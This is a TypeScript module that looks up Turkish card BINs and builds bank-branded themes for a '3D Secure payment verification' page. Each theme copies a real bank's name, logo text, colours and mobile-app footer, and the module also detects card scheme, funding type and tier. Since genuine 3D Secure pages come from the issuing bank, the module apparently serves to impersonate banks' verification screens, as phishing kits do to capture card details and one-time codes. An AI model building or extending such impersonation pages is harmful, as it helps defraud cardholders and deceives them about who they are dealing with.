import { BANK_BIN_ENTRIES, type BankBinEntry } from './bankBinData';

export interface BankThreeDTheme {
  pageBg: string;
  labelColor: string;
  iconBg: string;
  buttonColor: string;
  logoColor: string;
  logoIconBg: string;
  footerNote: string;
}

export interface BankBrand {
  id: string;
  name: string;
  logo: string;
  headerTitle: string;
  primaryColor: string;
  headerBg: string;
  textColor: string;
  accentColor: string;
  buttonTextColor: string;
  threeD: BankThreeDTheme;
}

export interface CardScheme {
  id: string;
  label: string;
  bgColor: string;
  textColor: string;
}

const DEFAULT_BANK: BankBrand = {
  id: 'generic',
  name: '3D Secure',
  logo: '3D',
  headerTitle: '3D SECURE ÖDEME DOĞRULAMA',
  primaryColor: '#5BC0C0',
  headerBg: '#5BC0C0',
  textColor: '#ffffff',
  accentColor: '#4AA8A8',
  buttonTextColor: '#ffffff',
  threeD: {
    pageBg: '#5BC0C0',
    labelColor: '#4AA8A8',
    iconBg: '#e8f6f6',
    buttonColor: '#4AA8A8',
    logoColor: '#2d8a8a',
    logoIconBg: '#5BC0C0',
    footerNote: 'Mobil bankacılık uygulamanızdan 3D Secure onayını kullanabilirsiniz.',
  },
};

function createBank(
  id: string,
  name: string,
  logo: string,
  colors: {
    primary: string;
    accent: string;
    pageBg?: string;
    iconBg: string;
    logoColor?: string;
    logoIconBg?: string;
  },
  footerNote: string
): BankBrand {
  const pageBg = colors.pageBg ?? colors.primary;
  const logoColor = colors.logoColor ?? colors.accent;
  const logoIconBg = colors.logoIconBg ?? colors.primary;

  return {
    id,
    name,
    logo,
    headerTitle: '3D SECURE ÖDEME DOĞRULAMA',
    primaryColor: colors.primary,
    headerBg: pageBg,
    textColor: '#ffffff',
    accentColor: colors.accent,
    buttonTextColor: '#ffffff',
    threeD: {
      pageBg,
      labelColor: colors.primary,
      iconBg: colors.iconBg,
      buttonColor: colors.accent,
      logoColor,
      logoIconBg,
      footerNote,
    },
  };
}

const BANK_BRANDS_BY_CODE: Record<number, BankBrand> = {
  10: createBank(
    'ziraat',
    'Ziraat Bankası',
    'ZİRAAT',
    { primary: '#008044', accent: '#006635', iconBg: '#e8f3ed' },
    'Bankkart Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  12: createBank(
    'halkbank',
    'Halkbank',
    'HALKBANK',
    { primary: '#FF6600', accent: '#E55A00', iconBg: '#fff0e6' },
    'Halkbank Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  15: createBank(
    'vakifbank',
    'VakıfBank',
    'VAKIFBANK',
    { primary: '#FFB300', accent: '#E6A100', iconBg: '#fff8e6' },
    'VakıfBank Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  32: createBank(
    'teb',
    'TEB',
    'TEB',
    { primary: '#00A651', accent: '#008844', iconBg: '#e8f5ef' },
    'CEPTETEB uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  46: createBank(
    'akbank',
    'Akbank',
    'AKBANK',
    { primary: '#E20074', accent: '#C00062', iconBg: '#fde8f3' },
    'Akbank Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  59: createBank(
    'sekerbank',
    'Şekerbank',
    'ŞEKERBANK',
    { primary: '#8B4513', accent: '#703810', iconBg: '#f5ede6' },
    'Şekerbank Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  62: createBank(
    'garanti',
    'Garanti BBVA',
    'GARANTI',
    {
      primary: '#00a19a',
      accent: '#49b848',
      pageBg: '#49b848',
      iconBg: '#e8f5e9',
      logoColor: '#005bac',
      logoIconBg: '#00a651',
    },
    "BonusFlaş'tan 3D Secure Mobil Onay'ı kullanmak için telefon ayarlarından BonusFlaş bildirimlerine izin vermelisiniz."
  ),
  64: createBank(
    'isbank',
    'Türkiye İş Bankası',
    'İŞ BANKASI',
    { primary: '#003087', accent: '#00266B', iconBg: '#e8edf7' },
    'Maximum Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  67: createBank(
    'yapikredi',
    'Yapı Kredi',
    'YAPI KREDİ',
    {
      primary: '#0055a5',
      accent: '#00a8ff',
      pageBg: '#0055a5',
      iconBg: '#f0f7ff',
    },
    'Yapı Kredi Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  71: createBank(
    'fortis',
    'Fortis Bank',
    'FORTIS',
    { primary: '#0054A6', accent: '#004388', iconBg: '#e8f0fa' },
    'Mobil bankacılık uygulamanızdan 3D Secure onayını kullanabilirsiniz.'
  ),
  92: createBank(
    'citibank',
    'Citibank',
    'CITIBANK',
    { primary: '#003B70', accent: '#002952', iconBg: '#e8eef5' },
    'Citi Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  96: createBank(
    'turkishbank',
    'Turkish Bank',
    'TURKISH BANK',
    { primary: '#1B365D', accent: '#142847', iconBg: '#e8edf3' },
    'Mobil bankacılık uygulamanızdan 3D Secure onayını kullanabilirsiniz.'
  ),
  99: createBank(
    'ing',
    'ING',
    'ING',
    { primary: '#FF6200', accent: '#E55800', iconBg: '#fff0e6' },
    'ING Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  103: createBank(
    'millennium',
    'Millennium Bank',
    'MILLENNIUM',
    { primary: '#C41230', accent: '#9E0E26', iconBg: '#fde8ec' },
    'Mobil bankacılık uygulamanızdan 3D Secure onayını kullanabilirsiniz.'
  ),
  108: createBank(
    'turkland',
    'Turkland Bank',
    'TURKLAND',
    { primary: '#004B87', accent: '#003A6A', iconBg: '#e8eef5' },
    'Mobil bankacılık uygulamanızdan 3D Secure onayını kullanabilirsiniz.'
  ),
  111: createBank(
    'qnb',
    'QNB Finansbank',
    'QNB',
    { primary: '#7B0041', accent: '#5F0032', iconBg: '#f3e6ec' },
    'QNB Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  123: createBank(
    'hsbc',
    'HSBC',
    'HSBC',
    { primary: '#DB0011', accent: '#B0000E', iconBg: '#fde8ea' },
    'HSBC Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  125: createBank(
    'eurobank',
    'Eurobank Tekfen',
    'EUROBANK',
    { primary: '#0066CC', accent: '#0055AA', iconBg: '#e8f1fa' },
    'Mobil bankacılık uygulamanızdan 3D Secure onayını kullanabilirsiniz.'
  ),
  134: createBank(
    'denizbank',
    'DenizBank',
    'DENİZBANK',
    { primary: '#0066CC', accent: '#0055AA', iconBg: '#e8f1fa' },
    'DenizBank Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  135: createBank(
    'anadolubank',
    'Anadolubank',
    'ANADOLUBANK',
    { primary: '#0054A6', accent: '#004388', iconBg: '#e8f0fa' },
    'Anadolubank Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  203: createBank(
    'albaraka',
    'Albaraka Türk',
    'ALBARAKA',
    { primary: '#1E4D2B', accent: '#163A20', iconBg: '#e8f0ea' },
    'Albaraka Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  205: createBank(
    'kuveytturk',
    'Kuveyt Türk',
    'KUVEYT TÜRK',
    { primary: '#006B3F', accent: '#005532', iconBg: '#e8f3ed' },
    'Kuveyt Türk Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  206: createBank(
    'turkiyefinans',
    'Türkiye Finans',
    'T.FİNANS',
    { primary: '#004B87', accent: '#003A6A', iconBg: '#e8eef5' },
    'Türkiye Finans Mobil uygulamasından 3D Secure mobil onayını kullanabilirsiniz.'
  ),
  208: createBank(
    'asya',
    'Asya Katılım Bankası',
    'ASYA',
    { primary: '#006633', accent: '#004D26', iconBg: '#e8f3ed' },
    'Mobil bankacılık uygulamanızdan 3D Secure onayını kullanabilirsiniz.'
  ),
  900: createBank(
    'provus',
    'Provus Bilişim',
    'PROVUS',
    { primary: '#374151', accent: '#1F2937', iconBg: '#F3F4F6' },
    'Mobil bankacılık uygulamanızdan 3D Secure onayını kullanabilirsiniz.'
  ),
};

const BIN_LOOKUP = new Map<string, BankBinEntry>(
  BANK_BIN_ENTRIES.map((entry) => [entry.bin, entry])
);

function cleanCardNumber(cardNumber: string): string {
  return cardNumber.replace(/\s/g, '');
}

function brandForBankCode(bankCode: number): BankBrand {
  return BANK_BRANDS_BY_CODE[bankCode] ?? DEFAULT_BANK;
}

export function lookupBinEntry(cardNumber: string): BankBinEntry | null {
  const cleaned = cleanCardNumber(cardNumber);
  if (cleaned.length < 6) return null;
  return BIN_LOOKUP.get(cleaned.slice(0, 6)) ?? null;
}

const BANK_NAME_CODE_HINTS: [RegExp, number][] = [
  [/ZIRAAT/i, 10],
  [/HALK\s?BANK|HALKBANK/i, 12],
  [/VAKIF/i, 15],
  [/\bTEB\b|T\.?\s*ECONOM|TURK\s*EKONOMI/i, 32],
  [/AKBANK/i, 46],
  [/SEKER/i, 59],
  [/GARANTI/i, 62],
  [/IS BANK|İŞ BANK|ISBANK/i, 64],
  [/YAPI\s?KREDI|YAPIKREDI/i, 67],
  [/\bING\b/i, 99],
  [/QNB|FINANSBANK/i, 111],
  [/HSBC/i, 123],
  [/DENIZ/i, 134],
  [/KUVEYT/i, 205],
  [/ALBARAKA/i, 203],
  [/TURKIYE FINANS/i, 206],
];

function inferBankCodeFromName(bankName: string): number | null {
  for (const [pattern, code] of BANK_NAME_CODE_HINTS) {
    if (pattern.test(bankName)) return code;
  }
  return null;
}

function resolveBankCode(cardNumber: string): number | null {
  const cleaned = cleanCardNumber(cardNumber);
  if (cleaned.length < 6) return null;

  const exact = BIN_LOOKUP.get(cleaned.slice(0, 6));
  if (!exact) return null;

  if (exact.bankCode !== 0) return exact.bankCode;
  return inferBankCodeFromName(exact.bankName);
}

const BANK_DISPLAY_NAMES: Partial<Record<number, string>> = {
  10: 'T.C. Ziraat Bankası',
  12: 'Halkbank',
  15: 'VakıfBank',
  32: 'TEB',
  46: 'Akbank',
  59: 'Şekerbank',
  62: 'Garanti BBVA',
  64: 'Türkiye İş Bankası',
  67: 'Yapı Kredi',
  99: 'ING',
  111: 'QNB Finansbank',
  123: 'HSBC',
  134: 'DenizBank',
  203: 'Albaraka Türk',
  205: 'Kuveyt Türk',
  206: 'Türkiye Finans',
};

export function detectBankBrand(cardNumber: string): BankBrand {
  const bankCode = resolveBankCode(cardNumber);
  if (bankCode === null || bankCode === 0) return DEFAULT_BANK;
  return brandForBankCode(bankCode);
}

export function detectBankName(cardNumber: string): string {
  const entry = lookupBinEntry(cardNumber);
  if (entry) {
    if (entry.bankCode !== 0 && BANK_DISPLAY_NAMES[entry.bankCode]) {
      return BANK_DISPLAY_NAMES[entry.bankCode]!;
    }
    const inferred = inferBankCodeFromName(entry.bankName);
    if (inferred !== null && BANK_DISPLAY_NAMES[inferred]) {
      return BANK_DISPLAY_NAMES[inferred]!;
    }
    return entry.bankName;
  }

  const brand = detectBankBrand(cardNumber);
  return brand.id === 'generic' ? 'Diğer' : brand.name;
}

export function detectCardScheme(cardNumber: string): CardScheme {
  const cleaned = cleanCardNumber(cardNumber);
  if (!cleaned) {
    return { id: 'other', label: 'KART', bgColor: '#64748b', textColor: '#ffffff' };
  }

  const binEntry = lookupBinEntry(cleaned);
  if (binEntry?.scheme === 'VISA') {
    return { id: 'visa', label: 'VISA', bgColor: '#1A1F71', textColor: '#ffffff' };
  }
  if (binEntry?.scheme === 'MASTERCARD') {
    return { id: 'mastercard', label: 'Mastercard', bgColor: '#EB001B', textColor: '#ffffff' };
  }
  if (binEntry?.scheme === 'TROY') {
    return { id: 'troy', label: 'Troy', bgColor: '#0C2D83', textColor: '#ffffff' };
  }

  if (cleaned.startsWith('9792')) {
    return { id: 'troy', label: 'Troy', bgColor: '#0C2D83', textColor: '#ffffff' };
  }

  if (cleaned.startsWith('34') || cleaned.startsWith('37')) {
    return { id: 'amex', label: 'AMEX', bgColor: '#006FCF', textColor: '#ffffff' };
  }

  if (cleaned.startsWith('4')) {
    return { id: 'visa', label: 'VISA', bgColor: '#1A1F71', textColor: '#ffffff' };
  }

  if (cleaned.startsWith('5') || /^2[2-7]/.test(cleaned)) {
    return { id: 'mastercard', label: 'Mastercard', bgColor: '#EB001B', textColor: '#ffffff' };
  }

  return { id: 'other', label: 'KART', bgColor: '#64748b', textColor: '#ffffff' };
}

function schemeShortLabel(scheme: CardScheme): string {
  if (scheme.id === 'mastercard') return 'Mastercard';
  if (scheme.id === 'visa') return 'Visa';
  if (scheme.id === 'troy') return 'Troy';
  if (scheme.id === 'amex') return 'Amex';
  return scheme.label;
}

export function detectCardFundingType(cardNumber: string): 'DEBIT' | 'CREDIT' | null {
  return lookupBinEntry(cardNumber)?.fundingType ?? null;
}

function formatCardTier(subType: string): string | null {
  const s = subType.trim().toUpperCase();
  if (!s) return null;
  if (['VISA', 'MASTERCARD', 'MAESTRO', 'TROY', 'AMEX', 'UATP', 'OTHER', 'LOCAL BRAND'].includes(s)) {
    return null;
  }
  if (s.includes('PREPAID RELOADABLE')) return 'PREPAID';
  if (s.includes('PREPAID')) return 'PREPAID';
  return s;
}

export function detectCardType(cardNumber: string): string {
  const entry = lookupBinEntry(cardNumber);
  const scheme = detectCardScheme(cardNumber);
  const schemeLabel = schemeShortLabel(scheme);
  const tier = entry?.subType ? formatCardTier(entry.subType) : null;

  const parts: string[] = [];
  if (entry?.fundingType === 'DEBIT') parts.push('Banka Kartı');
  else if (entry?.fundingType === 'CREDIT') parts.push('Kredi Kartı');
  if (tier) parts.push(tier);
  parts.push(schemeLabel);

  if (parts.length > 1) return parts.join(' · ');
  if (scheme.id === 'other') return 'Diğer';
  return schemeLabel;
}

export function maskCardNumber(cardNumber: string): string {
  const cleaned = cleanCardNumber(cardNumber);
  if (cleaned.length >= 4) {
    return `XXXX XXXX XXXX ${cleaned.slice(-4)}`;
  }
  return 'XXXX XXXX XXXX XXXX';
}

export const BANK_BIN_EXAMPLES = [
  { bin: '540669', bank: 'Garanti BBVA', scheme: 'Mastercard' },
  { bin: '454318', bank: 'Türkiye İş Bankası', scheme: 'Visa' },
  { bin: '435508', bank: 'Akbank', scheme: 'Visa' },
  { bin: '413226', bank: 'Ziraat Bankası', scheme: 'Visa' },
  { bin: '402458', bank: 'TEB', scheme: 'Visa' },
] as const;
